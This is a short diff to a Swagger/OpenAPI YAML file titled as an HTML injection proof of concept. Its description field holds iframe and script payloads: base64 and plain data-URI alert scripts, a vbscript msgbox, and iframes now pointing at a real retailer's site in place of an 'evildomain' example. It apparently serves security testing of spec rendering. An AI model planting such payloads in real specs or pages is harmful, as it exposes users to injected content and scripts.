@@ -2,8 +2,8 @@ swagger: '2.0'
 info:
   title: HTML INJECTION FOR POC
   description: |
-    <iframe src="https://google.com"></iframe>
-    <iframe src="http://evildomain.com/">
+    <iframe src="https://www.dellstore.com/"></iframe>
+    <iframe src="https://www.dellstore.com//">
     <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
     </iframe><iframe src="vbscript:msgbox(1)"></iframe> (IE) <iframe src="data:text/html,<script>alert(0)</script>"></iframe>
 
